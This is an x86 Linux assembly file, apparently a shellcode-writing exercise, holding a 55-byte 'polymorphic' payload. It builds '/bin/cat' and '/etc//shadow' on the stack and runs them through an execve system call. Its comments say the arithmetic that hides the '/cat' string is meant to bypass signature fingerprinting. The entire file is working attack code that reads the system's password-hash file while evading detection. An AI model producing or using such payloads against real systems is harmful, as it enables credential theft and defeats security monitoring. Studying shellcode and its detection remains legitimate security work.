; polymorphic shellcode for poly1_original
;Shellcode Length:  55
global _start			

section .text
_start:

;clear edx to zero. can be used instead of xor to clear out register
cdq
push   edx

; bypass fingerprint complete string /etc/shadow
mov esi,0x8572743f
sub esi,0x11111110
mov dword [esp-4] , esi
sub esp,4

push 0x6e69622f

mov    ebx,esp

push   edx
push   0x776f6461
push   0x68732f2f
push   0x6374652f
mov    ecx,esp

push   edx
push   ecx
push   ebx

mov    ecx,esp
;leverage push to clear instead of mov and also instead of  xor to clear
push 0xb
pop eax
int 0x80
